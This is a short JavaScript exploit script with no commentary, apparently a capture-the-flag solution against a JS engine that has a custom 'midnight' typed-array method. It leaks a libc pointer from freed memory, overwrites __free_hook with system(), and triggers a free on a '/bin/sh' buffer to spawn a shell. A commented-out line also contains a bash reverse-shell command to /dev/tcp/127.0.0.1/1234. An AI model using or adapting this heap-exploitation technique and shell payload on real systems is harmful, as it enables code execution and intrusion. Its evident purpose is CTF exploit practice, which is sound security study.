arr = new Uint32Array(0x420 / 4);

for (i = 0; i < arr.length; ++i) {
	arr[i] = 0x41424142;
}


// Math.atan2()

arr.midnight()

p1 = arr[0]
p2 = arr[1]

num = p2 * 0x100000000 + p1
num1 = p2 * 0x100000000 + p1
num2 = p2 * 0x100000000 + p1
libc_base = num1 - 0x1ecbe0
free_hook = num - 0x1ecbe0 + 0x1eee48
system = num2 - 0x1ecbe0 + 0x522c0
// Math.atan2(libc_base)
// Math.atan2(free_hook)
// Math.atan2(system)



arr1 = new Uint32Array(0x140 / 4);

for (i = 0; i < arr1.length; ++i) {
	arr1[i] = 0x41424142;
}

arr1.midnight()

arr1[0] = free_hook % 0x100000000
arr1[1] = free_hook / 0x100000000


arr2 = new Uint32Array(0x140 / 4);

for (i = 0; i < arr2.length; ++i) {
	arr2[i] = 0x41424142;
}

arr3 = new Uint32Array(0x140 / 4);

arr3[0] = system % 0x100000000
arr3[1] = system / 0x100000000

target = new Uint8Array(100);
// cmd = "bash -ic 'sh -i >& /dev/tcp/127.0.0.1/1234 0>&1' &"
cmd = "/bin/sh"

for (i = 0; i < cmd.length; i++) {
    target[i] = cmd.charCodeAt(i);
}

target[cmd.length] = 0

target.midnight()

Math.atan2()
